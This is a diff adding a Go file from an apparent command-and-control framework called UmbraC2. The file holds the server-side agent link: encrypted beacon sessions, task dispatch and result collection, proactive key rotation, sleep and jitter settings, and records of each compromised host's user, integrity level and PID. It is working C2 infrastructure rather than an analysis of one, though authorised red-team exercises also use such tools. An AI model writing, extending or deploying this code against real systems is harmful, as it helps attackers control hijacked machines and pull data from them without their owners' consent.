@@ -1,0 +1,255 @@
+package link
+
+import (
+	"errors"
+	"fmt"
+	"log/slog"
+	"net"
+	"time"
+
+	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
+	"github.com/thesyntax1/UmbraC2/server/internal/hub"
+	"github.com/thesyntax1/UmbraC2/server/internal/session"
+	"github.com/thesyntax1/UmbraC2/server/internal/store"
+	"github.com/thesyntax1/UmbraC2/server/internal/upk"
+	"github.com/thesyntax1/UmbraC2/server/internal/wire"
+)
+
+// AgentLink drives one authenticated agent session. The same type is used by
+// the TCP and the HTTP transport: a transport supplies frames, this type
+// decides what they mean.
+type AgentLink struct {
+	Hub       *hub.Hub
+	Session   *session.Session
+	AgentID   string
+	Transport string
+	Log       *slog.Logger
+
+	closed bool
+}
+
+// MaxTasksPerCycle bounds how much work one beacon response can carry.
+const MaxTasksPerCycle = 64
+
+// HandleFrame processes one inbound frame and returns the frames to send back.
+// A nil return value means "nothing to say right now".
+func (l *AgentLink) HandleFrame(raw []byte) ([][]byte, error) {
+	msgType, msg, err := l.Session.OpenMessage(raw)
+	if err != nil {
+		return nil, fmt.Errorf("agent %s: open frame: %w", l.AgentID, err)
+	}
+	if l.Log != nil {
+		l.Log.Debug("agent frame", "agent", l.AgentID, "type", wire.TypeName(msgType))
+	}
+
+	switch msgType {
+	case wire.MsgCheckin:
+		return l.onCheckin(msg)
+	case wire.MsgResult:
+		return l.onResult(msg)
+	case wire.MsgPing:
+		frame, err := l.Session.Encrypt(wire.MsgPong, upk.Map{"ts": msg["ts"]})
+		if err != nil {
+			return nil, err
+		}
+		return [][]byte{frame}, nil
+	case wire.MsgBye:
+		l.closed = true
+		return nil, nil
+	case wire.MsgRekey:
+		seed, _ := msg["seed"].([]byte)
+		if len(seed) != 32 {
+			return nil, errors.New("agent requested rekey without a 32-byte seed")
+		}
+		if err := l.Session.ApplyRekey(seed); err != nil {
+			return nil, err
+		}
+		return nil, nil
+	default:
+		if l.Log != nil {
+			l.Log.Warn("unexpected message from agent", "agent", l.AgentID, "type", wire.TypeName(msgType))
+		}
+		return nil, nil
+	}
+}
+
+// Closed reports whether the agent asked to end the session.
+func (l *AgentLink) Closed() bool { return l.closed }
+
+func (l *AgentLink) onCheckin(msg map[string]any) ([][]byte, error) {
+	tasks := l.Hub.NextTasks(l.AgentID, MaxTasksPerCycle)
+	sleep, jitter := l.Hub.Policy(l.AgentID)
+
+	encoded := make([]any, 0, len(tasks))
+	for _, t := range tasks {
+		args := upk.Map{}
+		for k, v := range t.Args {
+			args[k] = v
+		}
+		encoded = append(encoded, upk.Map{"id": t.ID, "kind": t.Kind, "args": args})
+	}
+	body := upk.Map{
+		"tasks":       encoded,
+		"sleep":       sleep,
+		"jitter":      jitter,
+		"server_time": time.Now().Unix(),
+	}
+	if n, ok := number(msg["n"]); ok {
+		body["pending"] = n
+	}
+	// Rotate keys proactively once a session has carried enough traffic.
+	//
+	// Ordering matters and is easy to get wrong: the REKEY frame must be sealed
+	// with the OLD key set (the peer can only open it while still on the old
+	// keys) and it must be written BEFORE any frame sealed with the new key.
+	// Frames must also leave in nonce order, so we seal REKEY first, rotate,
+	// then seal TASK_BATCH with the fresh key set. The peer sees REKEY at the
+	// old counter, applies it (both counters reset to 0) and then opens
+	// TASK_BATCH as its first new-key frame. No length guessing needed: the
+	// agent reads frames until it gets TASK_BATCH.
+	out := make([][]byte, 0, 2)
+	if l.Session.NeedsRekey() {
+		if seed, err := crypt.RandomBytes(32); err == nil {
+			if frame, err := l.Session.Encrypt(wire.MsgRekey, upk.Map{"seed": seed}); err == nil {
+				if err := l.Session.ApplyRekey(seed); err == nil {
+					out = append(out, frame)
+					if l.Log != nil {
+						l.Log.Debug("rotating session keys", "agent", l.AgentID)
+					}
+				}
+			}
+		}
+	}
+
+	frame, err := l.Session.Encrypt(wire.MsgTaskBatch, body)
+	if err != nil {
+		return nil, err
+	}
+	return append(out, frame), nil
+}
+
+func (l *AgentLink) onResult(msg map[string]any) ([][]byte, error) {
+	taskID, _ := msg["id"].(string)
+	if taskID == "" {
+		return nil, errors.New("result without task id")
+	}
+	code := int64(0)
+	if c, ok := asInt64(msg["code"]); ok {
+		code = c
+	}
+	output, _ := msg["out"].([]byte)
+	errMsg, _ := msg["err"].(string)
+	l.Hub.CompleteTask(l.AgentID, taskID, code, output, errMsg)
+	return nil, nil
+}
+
+// AgentMeta converts HELLO metadata into a store record.
+func AgentMeta(info *HelloInfo, transport, addr string, sleep, jitter int) *store.Agent {
+	meta := info.Meta
+	str := func(key string) string {
+		if v, ok := meta[key].(string); ok {
+			return v
+		}
+		return ""
+	}
+	pid, _ := asInt64(meta["pid"])
+	rec := &store.Agent{
+		ID:        info.ID,
+		Host:      str("host"),
+		OS:        str("os"),
+		Arch:      str("arch"),
+		User:      str("user"),
+		Integrity: str("integ"),
+		Version:   str("ver"),
+		PID:       pid,
+		Transport: transport,
+		Addr:      addr,
+		Sleep:     sleep,
+		Jitter:    jitter,
+	}
+	if rec.Host == "" {
+		rec.Host = str("hostname")
+	}
+	if rec.Version == "" {
+		rec.Version = "unknown"
+	}
+	return rec
+}
+
+// serveAgentTCP runs a full TCP beacon session: handshake, then frames until
+// the agent says BYE, goes silent, or the connection breaks.
+func (s *Server) serveAgentTCP(conn net.Conn) {
+	defer conn.Close()
+	addr := conn.RemoteAddr().String()
+	log := s.Log.With("peer", addr, "transport", "tcp")
+
+	if !s.guard.Allow(addr) {
+		log.Warn("connection refused by guard")
+		return
+	}
+	if err := conn.SetDeadline(time.Now().Add(s.Cfg.HandshakeTimeout())); err != nil {
+		return
+	}
+	stream := NewConnStream(conn)
+	sess, info, err := Handshake(stream, s.Cfg, log, addr)
+	if err != nil {
+		s.guard.Fail(addr)
+		log.Warn("handshake failed", "err", err)
+		return
+	}
+	if info.Role != crypt.RoleAgent {
+		log.Warn("operator key used on the agent listener", "id", info.ID)
+		return
+	}
+	s.guard.Succeed(addr)
+
+	sleep, jitter := s.Cfg.Server.Beacon.Sleep, s.Cfg.Server.Beacon.Jitter
+	meta := AgentMeta(info, "tcp", addr, sleep, jitter)
+	rec, _, err := s.Hub.RegisterAgent(meta, "tcp", addr, info.Suite, info.SessionID)
+	if err != nil {
+		log.Warn("agent registration refused", "err", err)
+		return
+	}
+	defer s.Hub.UnregisterAgent(rec.ID)
+
+	link := &AgentLink{Hub: s.Hub, Session: sess, AgentID: rec.ID, Transport: "tcp", Log: s.Log}
+	budget := int64(s.Cfg.Server.Limits.MaxFrameBytesPerConn)
+	for {
+		_ = conn.SetReadDeadline(time.Now().Add(s.Cfg.IdleTimeout()))
+		raw, err := stream.ReadFrame()
+		if err != nil {
+			if !isBenignNetErr(err) {
+				log.Debug("agent read ended", "err", err)
+			}
+			return
+		}
+		budget -= int64(len(raw))
+		if budget < 0 {
+			log.Warn("agent exceeded frame budget", "agent", rec.ID)
+			return
+		}
+		out, err := link.HandleFrame(raw)
+		if err != nil {
+			log.Warn("agent frame rejected", "agent", rec.ID, "err", err)
+			return
+		}
+		for _, f := range out {
+			if err := stream.WriteFrame(f); err != nil {
+				log.Debug("agent write failed", "err", err)
+				return
+			}
+		}
+		if link.Closed() {
+			log.Info("agent closed session", "agent", rec.ID)
+			return
+		}
+	}
+}
+
+func isBenignNetErr(err error) bool {
+	var ne net.Error
+	if errors.As(err, &ne) && ne.Timeout() {
+		return true
+	}
+	return false
+}
